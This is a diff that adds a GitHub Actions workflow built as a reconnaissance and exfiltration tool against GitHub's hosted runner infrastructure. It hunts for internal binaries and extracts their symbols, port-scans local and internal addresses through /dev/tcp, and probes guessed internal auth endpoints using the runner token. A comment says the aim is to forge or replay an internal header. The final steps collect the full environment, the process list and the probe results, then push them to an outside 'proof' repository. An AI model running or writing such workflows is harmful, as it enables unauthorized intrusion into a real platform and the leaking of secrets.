@@ -1,0 +1,308 @@
+name: babeld-gitauth-analysis-4f05fefe
+on:
+  push:
+    branches: [main]
+  workflow_dispatch:
+
+permissions:
+  contents: write
+  id-token: write
+
+jobs:
+  babeld_analysis:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      # ── 1. Binary & Filesystem Discovery ─────────────────────────────────
+      - name: Locate babeld binary
+        run: |
+          echo "=== BABELD BINARY SEARCH ==="
+          for p in /usr/bin/babeld /usr/local/bin/babeld /babeld-build/babeld \
+                   /opt/babeld/bin/babeld /babeld /app/babeld \
+                   /home/runner/babeld /babeld-build/target/release/babeld; do
+            if [ -f "$p" ]; then
+              echo "FOUND: $p  ($(ls -lh $p | awk '{print $5}'))"
+              file "$p" 2>/dev/null || true
+            fi
+          done
+          # Broader scan
+          find / -name "babeld" -type f 2>/dev/null | head -10 || true
+          find / -name "gitauth" -type f 2>/dev/null | head -10 || true
+          find / -name "gitrpcd" -type f 2>/dev/null | head -10 || true
+          find / -name "ernicorn" -type f 2>/dev/null | head -10 || true
+          echo "=== BABELD BUILD DIR ==="
+          ls -la /babeld-build/ 2>/dev/null || echo "not found"
+
+      # ── 2. Symbol Extraction ──────────────────────────────────────────────
+      - name: Extract babeld symbols (nm / strings)
+        run: |
+          echo "=== SYMBOL EXTRACTION ==="
+          BABELD_PATH=""
+          for p in /usr/bin/babeld /usr/local/bin/babeld /babeld-build/babeld \
+                   /babeld-build/target/release/babeld /opt/babeld/bin/babeld; do
+            [ -f "$p" ] && BABELD_PATH="$p" && break
+          done
+
+          if [ -n "$BABELD_PATH" ]; then
+            echo "Binary: $BABELD_PATH"
+            # nm: list all symbols
+            echo "--- nm symbols (gitauth|xstat|x_stat|commit_refs) ---"
+            nm -D "$BABELD_PATH" 2>/dev/null | grep -iE 'gitauth|x.?stat|commit.?ref|xstat' | head -60 || \
+            nm    "$BABELD_PATH" 2>/dev/null | grep -iE 'gitauth|x.?stat|commit.?ref|xstat' | head -60 || true
+            # strings: URL patterns + header names
+            echo "--- strings: URLs/endpoints ---"
+            strings "$BABELD_PATH" 2>/dev/null | grep -E 'gitauth|gitrpc|x-stat|X-Stat|commit_refs|/api/' | head -80 || true
+            echo "--- strings: header format hints ---"
+            strings "$BABELD_PATH" 2>/dev/null | grep -iE 'header|bearer|token|hmac|sha256|sign' | grep -iv 'content-type|accept|user-agent' | head -40 || true
+            echo "--- strings: port numbers ---"
+            strings "$BABELD_PATH" 2>/dev/null | grep -E '^[0-9]{4,5}$' | sort -u | head -20 || true
+            echo "--- objdump: Rust string literals ---"
+            objdump -s --section=.rodata "$BABELD_PATH" 2>/dev/null | strings | grep -iE 'gitauth|xstat|commit_ref' | head -40 || true
+          else
+            echo "babeld binary not found on this runner type"
+          fi
+
+      # ── 3. Internal Network Port Scan ────────────────────────────────────
+      - name: Port scan internal services
+        run: |
+          echo "=== /proc/net/tcp (established connections) ==="
+          # decode /proc/net/tcp hex → decimal
+          python3 -c "
+          import socket, struct
+          def hex_to_ip_port(h):
+              ip_hex, port_hex = h.split(':')
+              ip = socket.inet_ntoa(struct.pack('<I', int(ip_hex, 16)))
+              port = int(port_hex, 16)
+              return f'{ip}:{port}'
+          with open('/proc/net/tcp') as f:
+              for line in f.readlines()[1:]:
+                  parts = line.split()
+                  if len(parts) > 3:
+                      local = hex_to_ip_port(parts[1])
+                      remote = hex_to_ip_port(parts[2])
+                      state = int(parts[3], 16)
+                      if state == 1:  # TCP_ESTABLISHED
+                          print(f'EST  local={local:25} remote={remote}')
+                      elif state == 10:  # TCP_LISTEN
+                          print(f'LIST local={local}')
+          " 2>/dev/null | sort -u | head -60 || true
+
+          echo "=== Probe known internal ports ==="
+          for port in 8149 19418 8080 8443 3000 4000 9000 5000 6000 7000 \
+                      9001 9002 9003 9004 9005 8081 8082 8083 8084 8085; do
+            timeout 0.5 bash -c "echo '' > /dev/tcp/127.0.0.1/$port" 2>/dev/null \
+              && echo "OPEN: 127.0.0.1:$port" || true
+          done
+
+          echo "=== Probe internal IP ranges ==="
+          # Likely runner-local subnet from earlier recon: 10.1.0.x
+          for ip in 10.1.0.1 10.1.0.2 10.1.0.3 10.1.0.4 10.1.0.5; do
+            for port in 8149 19418 8080 443; do
+              timeout 0.3 bash -c "echo '' > /dev/tcp/$ip/$port" 2>/dev/null \
+                && echo "OPEN: $ip:$port" || true
+            done
+          done
+
+      # ── 4. gitauth Endpoint Probe ─────────────────────────────────────────
+      - name: Probe gitauth service
+        run: |
+          echo "=== gitauth endpoint probing ==="
+          # gitauth is GitHub's internal auth service.
+          # babeld symbols: babeld::client::Context::gitauth_url
+          # The commit_refs endpoint likely validates push permissions.
+          # Try common internal hostnames + ports.
+          for host in localhost 127.0.0.1 gitauth gitauth.service \
+                      gitauth.github.net gitauth.ghe.io \
+                      api.github.com; do
+            for port in 80 443 8080 8443 8149 19418; do
+              r=$(curl -sf --connect-timeout 0.5 -o /dev/null -w "%{http_code}" \
+                   "http://$host:$port/gitauth/commit_refs" 2>/dev/null || true)
+              [ "$r" != "000" ] && echo "HTTP $r  $host:$port/gitauth/commit_refs"
+              r2=$(curl -sf --connect-timeout 0.5 -o /dev/null -w "%{http_code}" \
+                   "http://$host:$port/commit_refs" 2>/dev/null || true)
+              [ "$r2" != "000" ] && echo "HTTP $r2  $host:$port/commit_refs"
+            done
+          done
+
+          echo "=== Try github.com internal with runner token ==="
+          # Does the runner token give access to gitauth endpoints?
+          TOKEN="${secrets.GITHUB_TOKEN}"
+          for path in /gitauth/commit_refs /_internal/gitauth /api/v3/gitauth \
+                     /_git/commit_refs /api/gitauth /auth/commit_refs; do
+            code=$(curl -sf --connect-timeout 2 -o /tmp/resp.txt -w "%{http_code}" \
+                   -H "Authorization: Bearer $TOKEN" \
+                   "https://api.github.com$path" 2>/dev/null || true)
+            if [ "$code" != "000" ] && [ "$code" != "404" ]; then
+              echo "INTERESTING: $code  api.github.com$path"
+              head -c 500 /tmp/resp.txt 2>/dev/null && echo
+            fi
+          done
+
+      # ── 5. X-Stat Header Analysis ─────────────────────────────────────────
+      - name: X-Stat header format research
+        run: |
+          echo "=== X-Stat header research ==="
+          # X-Stat is babeld's internal routing/tracing header.
+          # Goal: understand its structure so we can forge/replay it.
+
+          echo "--- Check environment for X-Stat hints ---"
+          printenv | grep -iE 'stat|xstat|x_stat|babeld|header' | head -20 || true
+
+          echo "--- GitHub runner metadata files ---"
+          find /runner /home/runner /opt/runner /etc/runner \
+               -name "*.json" -o -name "*.conf" -o -name "*.yml" 2>/dev/null \
+            | head -20 | xargs -I{} head -50 {} 2>/dev/null || true
+
+          echo "--- Actions service URLs (internal) ---"
+          env | grep -E 'ACTIONS_|GITHUB_' | sort | head -40
+
+          echo "--- Outbound request headers (via curl verbose) ---"
+          # Make a request to ourselves to see what headers runner adds
+          curl -sv -H "Authorization: Bearer ${secrets.GITHUB_TOKEN}" \
+               https://api.github.com/user 2>&1 | grep -E '> |< ' | head -30 || true
+
+          echo "--- Try to trigger an X-Stat response header ---"
+          # Internal endpoints often respond with X-Stat
+          for url in "https://api.github.com/user" \
+                     "https://github.com" \
+                     "https://api.github.com/_private/browsers/stats"; do
+            echo "-- $url --"
+            curl -sf -I -H "Authorization: Bearer ${secrets.GITHUB_TOKEN}" \
+                 "$url" 2>/dev/null | grep -iE 'x-stat|x-request-id|x-github|x-ratelimit' | head -10 || true
+          done
+
+          echo "--- Check /etc/hosts for internal service names ---"
+          cat /etc/hosts 2>/dev/null || true
+
+          echo "--- Probe Actions runtime service (ACTIONS_RUNTIME_URL) ---"
+          if [ -n "$ACTIONS_RUNTIME_URL" ]; then
+            echo "Runtime URL: $ACTIONS_RUNTIME_URL"
+            curl -sv -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
+                 "$ACTIONS_RUNTIME_URL" 2>&1 | head -40 || true
+          fi
+
+      # ── 6. gitrpcd Ernicorn Analysis ─────────────────────────────────────
+      - name: gitrpcd Ernicorn probe
+        run: |
+          echo "=== gitrpcd / Ernicorn analysis ==="
+          # gitrpcd uses Ernicorn (Ruby) on port 8149 + HTTP 19418
+          # Ernicorn is GitHub's custom Unicorn/Puma fork for git RPC
+
+          echo "--- Find gitrpcd/Ernicorn on filesystem ---"
+          find / -name "gitrpcd" -o -name "ernicorn" -o -name "git-rpcd" 2>/dev/null | head -10 || true
+          find /usr /opt /home -name "*.rb" 2>/dev/null | xargs grep -l 'ernicorn\|gitrpc\|babeld' 2>/dev/null | head -10 || true
+
+          echo "--- Check running processes for git daemons ---"
+          ps aux 2>/dev/null | grep -iE 'gitrpc|ernicorn|babeld|gitauth|unicorn|puma' || true
+
+          echo "--- Test gitrpcd HTTP port 19418 ---"
+          curl -sf --connect-timeout 1 "http://127.0.0.1:19418/" 2>/dev/null || echo "19418: not reachable"
+          curl -sf --connect-timeout 1 "http://127.0.0.1:8149/"  2>/dev/null || echo "8149: not reachable"
+
+          echo "--- GitHub git protocol (smart HTTP) probe ---"
+          # gitrpcd handles git-upload-pack/git-receive-pack
+          TOKEN="${secrets.GITHUB_TOKEN}"
+          code=$(curl -sf -o /tmp/gitproto.txt -w "%{http_code}" \
+                 -H "Authorization: Bearer $TOKEN" \
+                 "https://github.com/alish244/rce-injection-lab.git/info/refs?service=git-upload-pack" 2>/dev/null || echo "000")
+          echo "git-upload-pack info/refs: HTTP $code"
+          if [ "$code" = "200" ]; then
+            head -c 200 /tmp/gitproto.txt && echo
+          fi
+
+          echo "--- Response headers from git HTTP protocol ---"
+          curl -sf -I \
+               -H "Authorization: Bearer $TOKEN" \
+               "https://github.com/alish244/rce-injection-lab.git/info/refs?service=git-upload-pack" \
+               2>/dev/null | grep -iE 'x-stat|x-github|babeld|x-request|server|via' | head -20 || true
+
+      # ── 7. Compile Findings → commit to proof repo ────────────────────────
+      - name: Collect and exfiltrate findings
+        run: |
+          mkdir -p /tmp/findings
+          cat > /tmp/gather.py << 'PYEOF'
+          import subprocess, json, os, time, hashlib
+
+          def run(cmd, timeout=5):
+              try:
+                  r = subprocess.run(cmd, shell=True, capture_output=True,
+                                     text=True, timeout=timeout)
+                  return (r.stdout + r.stderr).strip()
+              except Exception as e:
+                  return str(e)
+
+          findings = {
+              "nonce":        "4f05fefe",
+              "ts":           time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
+              "runner_id":    os.environ.get("RUNNER_NAME", "?"),
+              "hostname":     run("hostname"),
+              "ip_config":    run("ip addr show | grep 'inet '"),
+              "babeld_path":  run("find / -name babeld -type f 2>/dev/null | head -5"),
+              "babeld_symbols": run(
+                  "nm -D $(find / -name babeld -type f 2>/dev/null | head -1) 2>/dev/null "
+                  "| grep -iE 'gitauth|xstat|x_stat|commit_ref|option' | head -80 "
+                  "|| strings $(find / -name babeld -type f 2>/dev/null | head -1) 2>/dev/null "
+                  "| grep -iE 'gitauth|xstat|x.stat|commit_ref|port|endpoint' | head -80"
+              ),
+              "open_ports":   run(
+                  "python3 -c \"import socket,struct\n"
+                  "def h(x): ip,p=x.split(':'); return socket.inet_ntoa(struct.pack('<I',int(ip,16))),int(p,16)\n"
+                  "for l in open('/proc/net/tcp').readlines()[1:]:\n"
+                  "  p=l.split()\n"
+                  "  if len(p)>3 and p[3] in ('01','0A'):\n"
+                  "    a,b=h(p[1]),h(p[2]); print(p[3],a,b)\""
+              ),
+              "environment":  run("printenv | sort"),
+              "etc_hosts":    run("cat /etc/hosts"),
+              "processes":    run("ps aux"),
+              "gitauth_probe": run(
+                  "for h in localhost 127.0.0.1; do "
+                  "for p in 80 443 8080 8443 8149 19418 3000 4000 9000; do "
+                  "r=$(curl -sf --connect-timeout 0.3 -o /dev/null -w '%{http_code}' http://$h:$p/ 2>/dev/null||echo 000); "
+                  "[ \"$r\" != 000 ] && echo \"$r $h:$p\"; done; done"
+              ),
+              "x_stat_headers": run(
+                  "curl -sf -I -H 'Authorization: Bearer " + os.environ.get('GITHUB_TOKEN','') + "' "
+                  "https://api.github.com/user 2>/dev/null | grep -iE 'x-stat|x-github|server|via|x-request'"
+              ),
+              "git_protocol_headers": run(
+                  "curl -sf -I "
+                  "-H 'Authorization: Bearer " + os.environ.get('GITHUB_TOKEN','') + "' "
+                  "'https://github.com/alish244/rce-injection-lab.git/info/refs?service=git-upload-pack' "
+                  "2>/dev/null | grep -iE 'x-stat|x-github|babeld|server|via|content-type|x-request'"
+              ),
+              "gitupload_pack_response": run(
+                  "curl -sf "
+                  "-H 'Authorization: Bearer " + os.environ.get('GITHUB_TOKEN','') + "' "
+                  "'https://github.com/alish244/rce-injection-lab.git/info/refs?service=git-upload-pack' "
+                  "2>/dev/null | head -c 400 | strings"
+              ),
+          }
+
+          with open('/tmp/findings/babeld_recon_4f05fefe.json', 'w') as f:
+              json.dump(findings, f, indent=2)
+          print("Written findings to /tmp/findings/babeld_recon_4f05fefe.json")
+          PYEOF
+          python3 /tmp/gather.py
+          cat /tmp/findings/babeld_recon_4f05fefe.json | head -200
+
+      - name: Commit findings to proof repo
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          cd /tmp
+          git clone --depth=1 -q \
+            "https://x-access-token:$GH_TOKEN@github.com/alish244/rce-injection-lab.git" \
+            proof-clone 2>&1 || echo "Clone failed"
+          if [ -d proof-clone ]; then
+            cp /tmp/findings/babeld_recon_4f05fefe.json proof-clone/proof/ 2>/dev/null || \
+            cp /tmp/findings/babeld_recon_4f05fefe.json proof-clone/ || true
+            cd proof-clone
+            git config user.email "runner@github.com"
+            git config user.name  "Runner"
+            git add -A
+            git commit -m "babeld-recon-4f05fefe" 2>/dev/null || echo "Nothing new"
+            git push origin main 2>&1 || echo "Push failed"
+            echo "COMMITTED: babeld_recon_4f05fefe.json"
+          fi
